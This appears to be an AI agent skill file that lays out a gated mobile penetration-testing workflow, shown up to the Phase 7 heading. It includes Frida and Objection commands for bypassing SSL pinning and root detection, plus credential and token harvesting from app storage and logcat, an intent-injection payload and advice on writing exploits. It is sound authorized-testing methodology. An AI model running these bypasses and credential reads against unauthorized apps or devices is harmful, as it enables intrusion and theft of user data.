---
name: mtest
version: 2.1.0
description: "Structured mobile application penetration testing framework with 10 gated phases for Android and iOS"
tags: [mobile, pentest, android, ios, frida, security]
trigger: "mobile pentest, mobile app test, APK test, IPA test, android security, ios security, dexguard bypass, appfence bypass, libaf-android, native root detection, inline svc bypass"
argument-hint: "<command: start|status|next|report|resume|cleanup>"
metadata:
  hermes:
    tags: [mobile, pentest, android, ios, frida, security]
    related_skills: [ptest, retools, scode, atest]
---

# Mobile Application Penetration Testing (mtest)

## Overview

10-phase gated linear workflow for mobile application security testing. Each phase must complete before advancing. Features a **feature-driven vulnerability analysis** methodology — testing is organized by app feature (login, payment, profile, etc.), not by vulnerability class. Covers both Android and iOS with static analysis, dynamic instrumentation, and API testing.

## Commands

| Command | Action |
|---------|--------|
| `start` | Begin new engagement — create output dir, define scope |
| `status` | Show current phase, progress, findings count |
| `resume` | Resume interrupted engagement — read state and continue |
| `next` | Advance to next phase (requires current phase gate satisfied) |
| `report` | Generate findings report (available from Phase 7+) |
| `cleanup` | Archive output, sanitize sensitive data |

## Output Structure

```
<workdir>/mtest-output/
├── state.yaml                # Engagement state tracker
├── scope.md                  # Engagement scope and targets
├── phase1-preflight/         # Tool setup verification
├── phase2-static/            # Decompilation, secrets, endpoints
│   ├── android/
│   └── ios/
├── phase3-protection/        # RASP assessment, bypass scripts
│   └── scripts/              # Frida bypass scripts
├── phase4-traffic/           # Proxy setup, intercepted requests, API map
├── phase5-attack-surface/    # Feature map, entry points
│   └── attack-surface-map.md
├── phase6-runtime/           # Frida hooks, data storage, deep links
│   ├── screenshots/
│   └── frida-output/
├── phase7-vuln-analysis/     # Feature-driven vulnerability testing
│   └── per-feature/          # One file per feature tested
├── phase8-api/               # Server-side API testing
├── phase9-exploitation/      # PoC scripts, exploit chains, validation
│   ├── poc/
│   └── evidence/
├── phase10-reporting/        # Final report artifacts
├── findings/                 # Individual finding files
│   ├── MTEST-001.md
│   └── ...
└── report.md                 # Final report
```

## State Tracking

On `start`, create `state.yaml`:

```yaml
engagement:
  name: ""
  target_app: ""
  package_id: ""
  bundle_id: ""
  started: ""
  platforms: []  # android, ios, or both

gateways:
  1_preflight: OPEN
  2_static_analysis: LOCKED
  3_protection_bypass: LOCKED
  4_traffic_analysis: LOCKED
  5_attack_surface: LOCKED
  6_runtime_testing: LOCKED
  7_vulnerability_analysis: LOCKED
  8_api_testing: LOCKED
  9_exploitation: LOCKED
  10_reporting: LOCKED

findings_count: 0
current_phase: 1

time_tracking:
  phase_1_start: ""
  phase_1_end: ""
  phase_2_start: ""
  phase_2_end: ""
  phase_3_start: ""
  phase_3_end: ""
  phase_4_start: ""
  phase_4_end: ""
  phase_5_start: ""
  phase_5_end: ""
  phase_6_start: ""
  phase_6_end: ""
  phase_7_start: ""
  phase_7_end: ""
  phase_8_start: ""
  phase_8_end: ""
  phase_9_start: ""
  phase_9_end: ""
  phase_10_start: ""
  phase_10_end: ""

notes: ""
```

### Finding ID Assignment

1. Read `findings_count` from `state.yaml`
2. Increment by 1
3. Use as finding ID: `MTEST-{count:03d}` (e.g., MTEST-001)
4. Write updated count back immediately

### Resume (`resume`)

1. Read `./mtest-output/state.yaml` to determine active phase
2. Read phase-specific output files to see what's completed
3. Report status and suggest next action
4. If `state.yaml` missing — scan output directories to reconstruct state

### N/A Phases

If a phase is genuinely not applicable (e.g., no API backend for Phase 8, no pinning/root detection for Phase 3), document the justification in the phase summary file and mark the gateway as `N/A` in state.yaml. Do NOT skip silently — always write a summary explaining why the phase doesn't apply. This counts as satisfying the gate.

### Offline/No-Network App Fast-Path

When the app has **no internet permission** and no HTTP URLs in source (purely local/offline app):
- Phase 3 (Protection Bypass): Root/jailbreak bypass may still apply. SSL pinning N/A.
- Phase 4 (Traffic Analysis): Mark as N/A entirely — no network traffic to intercept.
- Phase 5 (Attack Surface): Still required — focus on local features, intents, content providers.
- Phase 8 (API Testing): Mark as N/A entirely — no server-side API exists.
- Phase 6 (Runtime Testing): Still required — focus on broadcast injection, intent manipulation, data storage.

Detect this early in Phase 2 by checking: (1) no `android.permission.INTERNET` in manifest, (2) no HTTP/HTTPS URLs in decompiled source, (3) no network security config. If all three: flag as offline app and pre-mark N/A phases at end of Phase 2.

### Exploit Validation

Critical and High findings discovered during any phase MUST be validated dynamically in Phase 9 (Exploitation & Validation) before final reporting. Write exploitation evidence (logcat, proof files, screenshots) to the phase9-exploitation directory. If dynamic validation is not possible (no device, no account), document the limitation explicitly.

### When to Stop Chasing a Bypass

Anti-tampering bypass (root detection, Frida detection) is a MEANS to validate findings, not a finding itself. Apply these decision points:

1. **After 5 failed bypass attempts:** Stop and assess — is the finding you're trying to validate actually exploitable? If it depends on a runtime condition (feature flag, server config) that you can't verify, the bypass is pointless.

2. **After 10 failed bypass attempts:** Hard stop on bypass work. Submit findings with static evidence at Probable/Theoretical confidence. The code-level evidence is sufficient for bug bounty programs that accept static analysis.

3. **If bypass works but finding doesn't:** (e.g., you bypass root detection, trigger the deep link, but the WebView still blocks your URL) — the finding has a mitigating control you missed in static analysis. Re-analyze the code path, identify the control, and downgrade severity.

4. **Cost-benefit rule:** Time spent on bypass should be proportional to the finding's value. A Theoretical Medium finding doesn't justify 20+ bypass iterations. A Confirmed Critical does.

5. **Alternative validation paths:** Before spending hours on Frida bypass, consider: (a) test on a non-rooted device (no bypass needed), (b) use an emulator without root indicators, (c) repackage APK with Frida Gadget (no frida-server = nothing to detect), (d) accept static evidence and move on.

### Gateway Transition (`next`)

1. Verify phase gate criteria met (see each phase's Gate section)
2. Ask user confirmation: "Phase X complete. N findings. Advance to Phase Y?"
3. Update `state.yaml`: mark current gateway PASSED (or N/A), unlock next, record timestamps

### Publishing Walkthrough as Gist

To upload an exploitation walkthrough to GitHub Gist with a custom filename:
```bash
cp mtest-output/exploitation-walkthrough.md /tmp/<desired-filename>.md
gh gist create /tmp/<desired-filename>.md --public -d "<description>"
```
The `--filename` flag on `gh gist create` doesn't reliably rename — use a temp copy instead.

### APKSec Blog Article Generation

After completing an MHL challenge or real engagement, generate a DKatalis engineering blog article (`apksec-<topic>.md`) in the mtest-output directory. Format: Introduction → Background (vuln class explanation) → Target description → Code path trace → Gadget/exploit identification → Exploitation steps → Real-world scenario → Impact assessment → Remediation → Key takeaways → References. Style: technical depth for engineers, not CTF writeup format.

### Cleanup (`cleanup`)

1. Archive `./mtest-output/` to `mtest-output-{app}-{date}.tar.gz`
2. Remove YOUR credentials (proxy certs, test tokens) — keep found credentials as evidence
3. Print summary: findings by severity, phases completed, duration

---

## Effort Allocation

| Phase | % of Total Time | Rationale |
|-------|----------------|-----------|
| 1 Preflight | 5% | Setup, not testing |
| 2 Static Analysis | 15% | Foundation — maps everything for later phases |
| 3 Protection Bypass | 10% | Means to an end, not a finding itself (cap at decision tree limits) |
| 4 Traffic Analysis | 10% | Capture baseline, map API surface |
| 5 Attack Surface | 5% | Organize Phase 2+4 output into testable map |
| 6 Runtime Testing | 15% | Dynamic validation of static findings |
| 7 Vulnerability Analysis | 20% | Core testing — feature-by-feature exploitation |
| 8 API Testing | 10% | Server-side validation (delegate to atest for depth) |
| 9 Exploitation | 5% | Chain and prove — findings already identified |
| 10 Reporting | 5% | Write-up (findings documented incrementally) |

**Adjustment by context:**
- **Bug bounty:** Compress Phases 1/4/5/10, expand Phase 7 (find one Critical fast)
- **Internal pentest:** Even distribution, expand Phase 8 (comprehensive API coverage)
- **Banking app:** Expand Phase 3 (bypass work) + Phase 8 (attestation-protected APIs)
- **Offline/utility app:** Skip Phases 4/8, expand Phase 6 (local storage, IPC, deep links)

---

## App-Type Decision Tree

Determine app type after Phase 2 static analysis. Load full decision tree: `skill_view(name='mtest', file_path='references/app-type-decision-tree.md')`

**Quick summary:** Banking (heavy bypass + IDOR) | Social (deep links + WebView + API) | Utility (local storage + IPC) | Game/Unity (metadata + native RE) | Flutter (libapp.so strings + BoringSSL bypass)

---

## Bug Bounty Fast-Path

Optimized for finding one Critical/High fast. Load full guide: `skill_view(name='mtest', file_path='references/bug-bounty-fast-path.md')`

**TL;DR:** Static (30min) → Bypass (if pinned) → Traffic (15min) → Skip to Phase 7 highest-value features → Exploit → Submit. Time budget: 4-8 hours per app.

---

## Phase 1: Preflight

### Gate: scope.md exists, target app identified, tools verified

**Steps:**

1. Define scope:
   - Platform(s): Android / iOS / Both
   - App name and package/bundle ID
   - Version(s) to test
   - Testing type: black-box / grey-box / white-box
   - Device requirements: rooted/jailbroken, emulator acceptable?
   - Rules of engagement: what's off-limits

2. Acquire target app:
   ```bash
   # Android — from device
   adb shell pm list packages | grep -i <keyword>
   adb shell pm path <package>
   adb pull <path> target.apk

   # If split APK (base + split_config.*.apk), merge before analysis:
   java -jar APKEditor-1.4.7.jar m -i <dir_with_splits> -o merged.apk -f
   # This produces a single APK with all DEX files, native libs, and resources combined.
   # Always analyze the merged APK — split analysis misses cross-module references.

   # Android — from APKMirror/APKPure (black-box)
   # Download manually or use apkeep
   pip install apkeep
   apkeep -a <package_name> .

   # iOS — from jailbroken device (decrypted)
   python frida-ios-dump/dump.py <bundle_id>

   # iOS — from App Store (encrypted, limited use)
   ipatool download -b <bundle_id> -o target.ipa
   ```

3. Verify tooling:
   ```bash
   # Core tools check
   which jadx apktool frida objection adb 2>/dev/null
   frida --version
   objection version

   # Android emulator or device
   adb devices

   # Proxy (Burp/Caido) running
   curl -x http://127.0.0.1:8080 http://example.com
   ```

4. Create output directory and scope.md

**Reference:** `preflight-checklist.md`

---

## Phase 2: Static Analysis

### Gate: decompilation complete, secrets scan done, endpoints extracted, framework identified

**Fast-path priority (do these first, depth checks 7-15 after):**
1. Decompile + framework detection (steps 1-2)
2. Manifest: exported components, debuggable, allowBackup (step 3)
3. Deep links + WebView + JS bridge (step 6)
4. Secrets: API keys, hardcoded creds (step 4)
5. Endpoints: all URLs, API paths (step 5)

**Steps:**

1. Decompile and disassemble:
   ```bash
   # Android
   jadx -d jadx_out/ target.apk
   apktool d target.apk -o apktool_out/

   # Check for Unity IL2CPP (changes entire analysis approach)
   unzip -l target.apk | grep -q "libil2cpp.so" && echo "UNITY IL2CPP DETECTED"
   # If Unity: jadx is useless for game logic. Use global-metadata.dat strings instead.
   # See references/static-analysis.md → "Unity IL2CPP App Analysis" section.

   # iOS
   unzip target.ipa -d ipa_out/
   class-dump ipa_out/Payload/*.app/* > headers.h
   ```

2. Cross-platform framework detection:
   ```bash
   unzip -l target.apk | grep -qE "libflutter\.so|libapp\.so" && echo "FLUTTER DETECTED"
   unzip -l target.apk | grep -qE "index\.android\.bundle|libjsc\.so|libhermes\.so" && echo "REACT NATIVE DETECTED"
   unzip -l target.apk | grep -qE "assemblies/.*\.dll|libmonodroid\.so" && echo "XAMARIN DETECTED"
   ```

   **Framework-specific analysis:** Load `references/static-analysis.md` for full Flutter/RN/Xamarin methodology.

   **Flutter quick-start (most common for banking apps):**
   - jadx only shows thin wrapper — real logic in `libapp.so`
   - Primary technique: `strings lib/arm64-v8a/libapp.so | grep -E "^/(api|auth|account)" | sort -u`
   - Also extract: base URLs, package paths, JSON field names, IDOR path templates
   - SSL bypass requires `flutter_ssl_bypass.js` + iptables DNAT (standard hooks don't work)

3. Manifest/Info.plist analysis:
   - Android: debuggable, allowBackup, exported components, network security config
   - iOS: ATS exceptions, URL schemes, entitlements

4. Secrets hunting:
   - API keys, tokens, credentials in source
   - Firebase/cloud URLs
   - Private keys/certs in assets
   - Base64-encoded secrets

5. Endpoint extraction:
   - All HTTP(S) URLs in source
   - API path patterns
   - WebSocket endpoints
   - Third-party service integrations

6. Deep link → WebView hijack analysis (when deep links route to WebViews):
   - Find all `@DeepLink` annotations containing "web" or "url" in the route
   - Check if handler passes unvalidated URL to WebView
   - Check if WebView has `addJavascriptInterface` — map ALL `@JavascriptInterface` methods
   - Check for SecureWebView pattern (domain allowlist gating `loadUrl()`)
   - Check for feature flags controlling allowlist behavior (static analysis CANNOT determine production state)
   - See `deeplink-webview-hijack.md` for full exploitation patterns and severity rating matrix

7. Unsafe file operations (path traversal vectors):
   - `Uri.getLastPathSegment()` used as filename without sanitization
   - `new File(base, userInput)` with no canonical path check
   - `System.load()` / `System.loadLibrary()` from writable paths (getFilesDir, getCacheDir)
   - Deep link handlers that download and save files from attacker-controlled URIs

7a. Intent URI parsing (intent scheme hijacking):
   - Search for `Intent.parseUri(` — if the app parses user-controlled strings as intent URIs, this is a **high-value target**
   - Check what flags are passed: `Intent.parseUri(url, Intent.URI_INTENT_SCHEME)` (flag=1) allows full intent specification
   - Check if result is launched via `startActivity()` — enables launching non-exported activities
   - Check for sanitization: does the app strip component/package/extras before launching? Is the sanitization bypassable?
   - Common pattern: app allows `intent:` scheme in URL fields → attacker crafts `intent:#Intent;component=pkg/.InternalActivity;end`
   - **Key question:** Where does the URL string come from? If from user input, database, backup file, or deep link parameter — it's attacker-controlled

7b. Backup/restore as input validation bypass:
   - Check if app implements its own backup (not just `allowBackup` in manifest)
   - Look for: JSON/XML export to external storage, plaintext file writes to `getExternalFilesDir()`
   - **Critical check:** Does the restore path apply the SAME validation as the UI input path?
   - Common pattern: UI validates input (URL scheme, format, length) but restore/import reads raw data without checks
   - If backup is plaintext on external storage → any app (or adb) can modify it → inject payloads that bypass UI validation
   - Look for: `Gson.fromJson()`, `JSONObject()`, `ObjectInputStream` reading from external files without sanitization

8. Native library analysis (when .so files present):
   - List imports: `readelf -d lib/arm64-v8a/lib*.so` or `strings` + grep
   - **Dangerous imports:** `system`, `exec`, `popen`, `dlopen`, `Runtime.exec`
   - Check for embedded command strings: `strings lib.so | grep -iE "sh|bin|cmd|log|exec"`
   - Check for format string usage without bounds: `sprintf`, `printf` with user input
   - Identify JNI exports: `strings lib.so | grep Java_`
   - If `system()` + user input → likely command injection or buffer overflow
   - If fixed-size buffers + `memcpy`/`strcpy` without length check → overflow candidate
   - Test with long inputs (100, 200, 500 chars) and monitor `system()` via Frida
   - **Native "enabler" pattern:** Check what native functions ADD to objects, not just what they remove. A "sanitizer" that strips dangerous extras but then adds a validation flag (e.g., `putExtra("IS_VALID", true)`) makes the native function the enabler, not the blocker. Reverse the full function — don't stop at the first `removeExtra` call.
   - **Intent manipulation in native code:** Look for JNI calls to `putExtra`, `removeExtra`, `setData`, `setComponent`, `setPackage`, `getBooleanExtra`. Map the full sequence: what's removed vs what's added. The final state of the intent after native processing is what matters.

9. WebView + JavaScript bridge analysis (when WebView with JS enabled found):
   - Check for `addJavascriptInterface()` — exposes Java/native methods to JS
   - Map ALL `@JavascriptInterface` methods — these are the attack surface from any loaded page
   - Check if WebView loads attacker-controlled URLs (deep links, intent extras, no domain restriction)
   - Check for dangerous operations in bridge methods: file I/O, native calls, `system()`, `Runtime.exec()`, `ProcessBuilder`
   - Check URL validation in `shouldOverrideUrlLoading()` (or lack thereof)
   - Check WebView settings: `setAllowFileAccess`, `setAllowContentAccess`, `setMixedContentMode`, `usesCleartextTraffic`
   - If bridge exposes native methods with buffer operations → combine with native overflow analysis
   - If app accepts any http/https URL via deep link + has JS bridge → **remote RCE candidate**

10. Crypto analysis (when encryption/decryption is found):
   - Identify algorithm, mode, padding (e.g., AES/ECB/PKCS5Padding)
   - Check key derivation: hardcoded? small keyspace? no stretching?
   - Check for hardcoded ciphertext that can be attacked offline
   - If key is derived from user input (PIN, password): estimate brute-force time
   - Write a cracking script immediately if keyspace < 10M (runs in seconds)

11. Exported component analysis:
   - Identify all exported Activities, BroadcastReceivers, Services, ContentProviders
   - Check for permission protection (custom permissions, signature level)
   - Map intent-filters and actions — these are the external attack surface
   - BroadcastReceivers with no permission = any app can trigger them
   - Dynamic receivers registered without RECEIVER_NOT_EXPORTED flag (Android 14+ requirement)

12. Deserialization / unsafe parsing:
   - **SnakeYAML `yaml.load()`** — instantiates arbitrary classes via `!!` tag. Safe alternative: `new Yaml(new SafeConstructor())` or `yaml.loadAs(input, Map.class)`
   - **Jackson `ObjectMapper`** with `enableDefaultTyping()` or `@JsonTypeInfo(use=CLASS)` → polymorphic RCE
   - **ObjectInputStream** — Java native deserialization, gadget chains
   - **Gson/Jackson with polymorphic types** — type confusion attacks
   - **XMLDecoder** — arbitrary object instantiation, direct method invocation
   - Pattern: find the "sink" class first (e.g., a class whose constructor calls `Runtime.exec()`), then find the deserialization entry point that can reach it
   - Check for gadget classes on classpath: constructors calling `Runtime.exec()`, `ProcessBuilder`, file I/O, reflection
   - Check input source: user-controlled (intents, file pickers, network) = exploitable
   - If found: write exploit payload immediately (see `deserialization-attacks.md`, `yaml-deserialization-rce.md`)

13. Exported ContentProvider analysis:
   - Identify all providers with `android:exported="true"` and no `android:permission`
   - Check `query()` for SQL injection (raw string concatenation in selection)
   - Check `openFile()` for path traversal (unsanitized `getLastPathSegment()`)
   - Check for weak authentication (PIN/password in selection parameter with small keyspace)
   - Test access: `adb shell content query --uri content://<authority>`
   - See `content-provider-attacks.md` for exploitation patterns

14. Binary protections check:
   - Android: ProGuard/R8 obfuscation, native libs
   - iOS: PIE, stack canary, ARC, code signing

15. Automated scanning:
   ```bash
   # MobSF (comprehensive)
   docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
   # Upload APK/IPA at http://localhost:8000
   ```

**Reference:** `static-analysis.md`, `native-re-mcp.md`, `android-path-traversal-rce.md`, `crypto-key-cracking.md`, `native-buffer-overflow.md`, `deserialization-attacks.md`, `content-provider-attacks.md`, `yaml-deserialization-rce.md`, `deeplink-webview-hijack.md`

---

## Phase 3: Protection Assessment & Bypass

### Gate: protection mechanisms identified and bypassed (or documented as not needed/not bypassable); app launches with instrumentation capability

This phase assesses and bypasses client-side protections (RASP, root detection, SSL pinning, anti-tampering) BEFORE traffic analysis. Without bypasses working, Phases 4-9 are blocked.

**Steps:**

1. Identify protection mechanisms:
   - Root/jailbreak detection (su binary, Magisk, KernelSU, Cydia)
   - Frida/instrumentation detection (port 27042, /proc/self/maps, frida-agent strings)
   - SSL certificate pinning (OkHttp, TrustManager, network_security_config)
   - Anti-tampering / integrity checks (signature verification, DEX checksum)
   - Emulator detection (Build properties, sensors, telephony)
   - Debug detection (debuggable flag, TracerPid, JDWP)
   - Commercial SDKs: DexGuard/AppFence, Eversafe, Promon, Arxan

2. SSL pinning bypass:
   ```bash
   # Frida (comprehensive — native Android apps)
   frida -U -f <package> -l ssl_pinning_bypass.js

   # Flutter apps — MUST use flutter_ssl_bypass.js (standard hooks don't work)
   # Flutter uses BoringSSL in libflutter.so, ignores system proxy + CA store
   # See frida-scripts.md → "Flutter SSL Pinning Bypass" for full script
   # Key: scan only r-x ranges, hook by byte pattern, use Python to keep session alive
   # Also requires iptables redirect (Flutter ignores system proxy):
   #   iptables -t nat -A OUTPUT -p tcp -m owner --uid-owner <UID> --dport 443 -j DNAT --to <HOST>:8080

   # Objection (quick — native apps only, NOT Flutter)
   objection -g <package> explore
   android sslpinning disable   # or: ios sslpinning disable

   # APK patching (persistent, no Frida needed)
   # Inject network_security_config.xml trusting user CAs
   # Rebuild + re-sign APK
   ```

3. Root/jailbreak detection bypass:
   ```bash
   # Frida (comprehensive)
   frida -U -f <package> -l root_bypass.js

   # Objection (quick)
   objection -g <package> explore
   android root disable   # or: ios jailbreak disable

   # Combined launch
   frida -U -f <package> -l root_bypass.js -l ssl_pinning_bypass.js
   ```

4. Anti-tampering bypass (DexGuard/AppFence/Eversafe):
   - See `references/operational-notes.md` → DexGuard section for full methodology
   - Priority order: Shamiko+Zygisk > hluda-server > Frida Gadget > non-rooted device > static evidence only
   - Apply "When to Stop Chasing a Bypass" decision tree

5. Verify: app launches, Frida attaches successfully, no detection popups/crashes

**Reference:** `dynamic-setup.md`, `frida-scripts.md`, `dexguard-appfence-bypass.md`

**Script:** `scripts/flutter_ssl_bypass.js` — ready-to-use Flutter BoringSSL bypass for ARM64 (supports Flutter 3.10-3.24+). Use with: `frida -U -f <package> -l scripts/flutter_ssl_bypass.js`

**Script:** `scripts/ssl_pinning_bypass.js` — universal SSL pinning bypass for native Android apps (OkHttp3, TrustManagerImpl, Conscrypt, WebViewClient, Apache HTTP). Use with: `frida -U -f <package> -l scripts/ssl_pinning_bypass.js`

**Script:** `scripts/root_bypass.js` — universal root/jailbreak detection bypass (File.exists, Runtime.exec, RootBeer, native access(), /proc/self/maps filtering). Use with: `frida -U -f <package> -l scripts/root_bypass.js`

**Cross-reference:** For DexGuard/AppFence protected apps, load the `dexguard-native-re` skill for full RE methodology and bypass scripts.

---

## Phase 4: Traffic Analysis

### Gate: proxy intercepting traffic, API endpoints mapped, auth flow documented, at least one full user journey captured (OR documented N/A with justification if app has no network communication)

**Steps:**

1. Install proxy CA certificate:
   ```bash
   # Android (system-level, requires root)
   openssl x509 -inform DER -in cacert.der -out cacert.pem
   HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
   cp cacert.pem ${HASH}.0
   adb root && adb remount
   adb push ${HASH}.0 /system/etc/security/cacerts/
   adb shell "chmod 644 /system/etc/security/cacerts/${HASH}.0"
   adb reboot

   # iOS
   # Settings > General > Profile > Install Burp CA
   # Settings > About > Certificate Trust Settings > Enable Full Trust
   ```

2. Configure proxy:
   ```bash
   # Android
   adb shell settings put global http_proxy <host_ip>:8080

   # Invisible proxy (apps ignoring system proxy)
   adb shell iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to <host_ip>:8080
   adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to <host_ip>:8080
   ```

3. Capture baseline traffic:
   - Launch app, complete registration/login flow
   - Navigate all major features
   - Trigger push notifications, background sync
   - Export all requests from proxy

4. Map API surface:
   - Base URLs and versioning
   - Authentication mechanism (JWT, OAuth, session, API key)
   - Request/response patterns
   - File upload/download endpoints
   - WebSocket connections

5. Document auth flow:
   - Login sequence (OTP, biometric, PIN)
   - Token lifecycle (access token, refresh token, expiry)
   - Session management
   - Multi-factor authentication steps

6. Identify interesting patterns:
   - Sequential/predictable IDs (IDOR candidates)
   - Sensitive data in responses (PII, financial data)
   - Missing security headers
   - Verbose error messages
   - Rate limiting (or lack thereof)
   - Certificate pinning coverage gaps

**Reference:** `traffic-analysis.md`, `burp-mcp-integration.md`

---

## Phase 5: Attack Surface Mapping

### Gate: Feature map documented with entry points per feature; prioritized by risk

This phase creates the structured map that drives Phase 7 (Vulnerability Analysis). Every testable feature is catalogued with its entry points, data sensitivity, and applicable vulnerability classes.

**Auto-generation:** Build attack-surface-map.md directly from Phase 2 exported components + deep links + Phase 4 API endpoints. Don't re-discover — organize what you already found.

**Steps:**

1. Enumerate all user-facing features from:
   - App UI navigation (every screen, every action)
   - Deep link routes (from Phase 2 static analysis)
   - API endpoints (from Phase 4 traffic analysis)
   - Exported components (from Phase 2 manifest analysis)
   - WebView bridges (from Phase 2 JS interface analysis)
   - Background services and receivers

2. For each feature, document:
   - Feature name and description
   - Entry points (UI path, API endpoint, deep link, intent, broadcast)
   - Data handled (PII, financial, auth tokens)
   - Trust boundaries crossed (client→server, app→OS, app→other apps)
   - Authentication/authorization requirements
   - Third-party integrations (payment SDK, analytics, social login)

3. Prioritize by risk:
   - Financial transactions (transfer, payment, top-up) → Critical
   - Authentication/session (login, OTP, biometric, token refresh) → Critical
   - PII handling (profile, KYC, documents) → High
   - File operations (upload, download, share) → High
   - Communication (chat, notifications, deep links) → Medium
   - Social features (feed, comments, likes) → Medium
   - Settings/preferences (theme, language, notifications) → Low

4. Output: `attack-surface-map.md` in `mtest-output/phase5-attack-surface/`

**Attack Surface Map Template:**

```markdown
# Attack Surface Map — [App Name]

## Feature Inventory

| # | Feature | Risk | Entry Points | Data Sensitivity | Auth Required |
|---|---------|------|-------------|-----------------|---------------|
| 1 | Login/Auth | Critical | UI, POST /auth/login, deeplink://auth | Credentials, OTP, tokens | No (pre-auth) |
| 2 | Money Transfer | Critical | UI, POST /transfer/*, deeplink://pay | Account numbers, amounts | Yes |
| 3 | Profile | High | UI, GET/PUT /user/profile | PII, photos | Yes |
| 4 | File Upload | High | UI, POST /upload, content://provider | Documents, images | Yes |
| 5 | Chat/Messaging | Medium | UI, WebSocket /ws/chat | Messages, media | Yes |
| ... | | | | | |

## Per-Feature Detail

### Feature 1: Login/Auth
- **UI Path:** Launch → Login screen
- **API Endpoints:** POST /auth/login, POST /auth/otp/verify, POST /auth/refresh
- **Deep Links:** deeplink://auth/reset, deeplink://auth/verify
- **Intents:** com.app.LOGIN_COMPLETE (broadcast)
- **Data:** username, password, OTP, JWT, refresh token, device ID
- **Trust Boundaries:** Client→Server (credentials), Server→Client (tokens)
- **Third-party:** Firebase Auth, Google Sign-In
- **Applicable Vuln Classes:** Brute force, credential stuffing, OTP bypass, session fixation, token leakage, biometric bypass

[Repeat for each feature...]
```

**Cross-reference:** Feed this map directly into Phase 7 as the testing checklist.

---

## Phase 6: Runtime Testing

### Gate: at least 3 test categories completed from the checklist below; data storage inspected; deep links tested

**Prioritization (hit these in order for maximum finding density):**
1. **Data Storage** — fastest, often yields Low-Medium findings in minutes (plaintext tokens, PII in SharedPrefs, unencrypted Hive)
2. **Deep Link / URL Scheme Injection** — high-value, especially if Phase 2 found WebView + JS bridge
3. **Intent/IPC Injection** — if exported components found in Phase 2, test them now
4. **WebView Attacks** — only if JS bridge identified in Phase 2 static analysis
5. **Biometric/PIN Bypass** — only if client-side-only auth detected (check if server validates)
6. **Screenshot/Screen Recording** — quick check, usually Low severity
7. **Binary Patching** — last resort, time-intensive, only if specific bypass needed

**Skip guidance:** If Phase 2 found no exported components → skip #3. If no WebView with JS enabled → skip #4. If biometric is server-validated → skip #5. Don't test everything blindly — let Phase 2 findings guide you.

**Production Validation Rule:** Before any finding can be rated Critical (Confirmed), it MUST be demonstrated on a non-rooted production device with a logged-in user account. Findings validated only on rooted/instrumented devices are capped at High (Probable) because:
- Feature flags may behave differently on rooted vs non-rooted
- Server-side checks may detect rooted devices and change responses
- Anti-tampering bypasses may alter app behavior in ways that create false positives

If you cannot test on a non-rooted device, explicitly state this limitation and cap severity at High.

**Test Categories:**

1. **Data Storage:**
   ```bash
   # Android SharedPreferences
   adb shell "run-as <package> cat /data/data/<package>/shared_prefs/*.xml"
   # Or with root:
   adb shell "su -c 'cat /data/data/<package>/shared_prefs/*.xml'"

   # Android SQLite
   adb shell "run-as <package> ls /data/data/<package>/databases/"

   # iOS Keychain
   objection -g <bundle_id> explore
   ios keychain dump

   # iOS NSUserDefaults
   ios nsuserdefaults get

   # Clipboard monitoring
   # Logcat sensitive data
   adb logcat | grep -i "token\|password\|key\|secret"
   ```

   **Local storage security checklist (rooted device):**
   - **PIN/login attempt counters:** Check if `pinAuthAttempts`, `loginAttempts` etc. are in plaintext SharedPreferences. If resettable → client-side lockout bypass (Low, requires root).
     ```bash
     grep -iE "attempt|lock|pin|biometric" shared_prefs/FlutterSharedPreferences.xml
     # Reset test: modify value → force-stop → restart → verify app accepts new value
     ```
   - **Token storage:** Check if JWT/refresh tokens are plaintext or encrypted. Look for:
     - Hive databases (`app_flutter/*.hive`) — run `strings` on them for plaintext tokens
     - `cipherImplementationKeystore.xml` — indicates Android Keystore encryption (good)
     - If tokens in Hive are binary blobs (not readable JWT strings) → encrypted at rest (good)
   - **Cached sensitive data:** Check Hive boxes for plaintext PII:
     ```bash
     for f in app_flutter/*.hive; do
       echo "=== $f ==="; strings "$f" | grep -iE "token|password|account|card|[0-9]{10,}" | head -5
     done
     ```
   - **Flutter SharedPreferences leakage:** Look for account numbers, customer IDs, phone numbers stored unencrypted. These are Low severity but worth documenting for banking apps.
   - **Biometric flags:** Check if `activeFingerprint`, `validBiometricLimit` can be flipped to bypass biometric enrollment requirements.

2. **Deep Link / URL Scheme Injection:**
   ```bash
   # Android
   adb shell am start -a android.intent.action.VIEW -d "scheme://path?param=INJECTED"

   # iOS (via Frida)
   # Test: open redirect, XSS via WebView, auth bypass
   ```
   - **Parameter name fuzzing:** When a deep link handler fails to extract a value despite correct URI format, the parameter name may differ from what hardcoded URLs suggest. Enumerate candidate names from: (1) field names in decompiled source/metadata (e.g., `updateHost` → try `host=`), (2) method names (`checkHost` → `host=`), (3) common variants (`url=`, `server=`, `target=`, `endpoint=`, `addr=`). Test each systematically before concluding extraction is broken.
   - **Deep link parameters leaked to analytics:** After triggering any deep link, check logcat for analytics SDK logging. CleverTap, Mixpanel, Firebase Analytics often log the full deep link URI (including query parameters) as a "page" or "referrer" event. Test with sensitive parameters:
     ```bash
     # Trigger deep link with financial params
     adb shell am start -d "scheme://app/transfer?amount=1000000&to=9999999999" <package>
     # Check if params leak to analytics
     adb logcat -d -t 30 | grep -iE "CleverTap|Mixpanel|firebase.*event" | grep -i "referrer\|page\|event"
     ```
     If the full URI (including amount, account numbers) appears in analytics events, this is a data leakage finding (Low-Medium depending on sensitivity of leaked params). Combined with unencrypted analytics transport (no SSL pinning on analytics SDK), it becomes Medium.

3. **WebView Attacks:**
   - JavaScript enabled + addJavascriptInterface = RCE potential
   - File access from WebView context
   - URL loading with user-controlled input

4. **Intent/IPC Injection (Android):**
   ```bash
   adb shell am start -n <package>/.ExportedActivity
   adb shell am broadcast -a <package>.ACTION --es "data" "injected"
   adb shell content query --uri content://<package>.provider/table
   ```

5. **Biometric/PIN Bypass:**
   - Hook biometric callbacks via Frida (see Phase 7 Execution Procedures → #7)
   - Check if auth is client-side only vs server-validated
   - Test fallback mechanisms

6. **Screenshot/Screen Recording Protection:**
   - Check FLAG_SECURE on sensitive screens
   - Test screen capture during sensitive operations

7. **Binary Patching:**
   - Modify smali to skip checks
   - Patch conditional jumps
   - Re-sign and test modified behavior

**Reference:** `runtime-testing.md`, `frida-scripts.md`, `deep-link-path-traversal.md`

---

## Phase 7: Vulnerability Analysis (Feature-Driven)

